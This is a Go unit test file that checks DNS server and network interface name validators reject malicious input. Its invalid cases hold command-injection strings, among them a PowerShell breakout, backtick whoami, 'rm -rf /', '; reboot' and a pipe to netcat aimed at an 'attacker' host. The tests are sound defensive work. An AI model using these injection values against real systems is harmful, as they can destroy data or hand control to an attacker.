package system

import "testing"

func TestValidateDNSServers(t *testing.T) {
	valid := [][]string{
		{"8.8.8.8"},
		{"1.1.1.1", "1.0.0.1"},
		{"2606:4700:4700::1111"},
		{"9.9.9.9", "149.112.112.112"},
	}
	for _, servers := range valid {
		if err := ValidateDNSServers(servers); err != nil {
			t.Errorf("ValidateDNSServers(%v) = %v, want nil", servers, err)
		}
	}

	invalid := [][]string{
		{},                                    // empty
		{""},                                  // blank entry
		{"not-an-ip"},                         // hostname
		{"8.8.8.8'); Start-Process calc; ('"}, // injection payload
		{"8.8.8.8", "evil`whoami`"},           // backtick payload
		{"8.8.8.8 && rm -rf /"},               // shell chain
		{"1.1.1.1", "2.2.2.2", "3.3.3.3", "4.4.4.4", "5.5.5.5", "6.6.6.6", "7.7.7.7", "8.8.8.8", "9.9.9.9"}, // > max
	}
	for _, servers := range invalid {
		if err := ValidateDNSServers(servers); err == nil {
			t.Errorf("ValidateDNSServers(%v) = nil, want error", servers)
		}
	}
}

func TestValidateInterfaceAlias(t *testing.T) {
	valid := []string{"Ethernet", "Wi-Fi", "Local Area Connection 2", "eth0"}
	for _, name := range valid {
		if err := ValidateInterfaceAlias(name); err != nil {
			t.Errorf("ValidateInterfaceAlias(%q) = %v, want nil", name, err)
		}
	}

	invalid := []string{
		"",
		"Ethernet'; Stop-Service",
		"Wi-Fi`whoami`",
		"eth0; reboot",
		"eth0 | nc attacker 1",
		"eth0\nmalicious",
	}
	for _, name := range invalid {
		if err := ValidateInterfaceAlias(name); err == nil {
			t.Errorf("ValidateInterfaceAlias(%q) = nil, want error", name)
		}
	}
}
